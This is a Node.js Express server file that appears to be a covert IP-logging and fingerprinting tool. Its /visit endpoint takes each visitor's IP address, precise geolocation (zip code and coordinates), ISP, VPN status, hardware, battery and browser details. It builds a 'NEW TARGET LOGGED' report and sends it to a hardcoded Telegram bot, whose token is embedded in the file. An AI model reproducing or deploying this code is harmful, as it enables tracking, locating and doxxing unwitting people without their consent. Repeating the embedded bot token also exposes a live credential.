const express = require("express");
const path = require("path");
const app = express();
app.use(express.json());

const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";

async function sendTelegram(text) {
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
  });
}

app.post("/visit", async (req, res) => {
  try {
    const client = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // 1. Full Geo & ISP Data (Your old logic + more fields)
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=16777215`);
    const geo = await geoRes.json();

    const report = `
<b>🚀 NEW TARGET LOGGED (100% INTEL)</b>
------------------------------------
<b>🌐 NETWORK & ISP</b>
<b>IP:</b> <code>${ip}</code>
<b>ISP:</b> ${geo.isp}
<b>Organization:</b> ${geo.org}
<b>Type:</b> ${geo.mobile ? "Mobile Data 📱" : "Broadband/WiFi 🏠"}
<b>VPN/Proxy:</b> ${geo.proxy ? "YES ⚠️" : "No ✅"}

<b>📍 LOCATION</b>
<b>City:</b> ${geo.city}, ${geo.country}
<b>Zip Code:</b> ${geo.zip}
<b>Coordinates:</b> ${geo.lat}, ${geo.lon}
<b>Timezone:</b> ${geo.timezone}

<b>💻 HARDWARE DETAILS</b>
<b>GPU:</b> <code>${client.gpu}</code>
<b>CPU Cores:</b> ${client.hw?.cores}
<b>RAM:</b> ~${client.hw?.ram} GB
<b>Resolution:</b> ${client.display?.res}
<b>Platform:</b> ${client.hw?.platform}

<b>🔋 STATUS</b>
<b>Battery:</b> ${client.bat?.lvl} (${client.bat?.chg ? "Charging" : "Discharging"})
<b>Connection:</b> ${client.net?.type} (Speed: ${client.net?.speed})

<b>🧠 BROWSER</b>
<b>User-Agent:</b> <code>${req.headers["user-agent"]}</code>
<b>Referrer:</b> ${client.env?.ref}
------------------------------------
`;

    await sendTelegram(report);
    res.json({ status: "success" });
  } catch (e) { res.status(500).send("error"); }
});

app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.listen(3000, () => console.log("Intelligence Server Active..."));
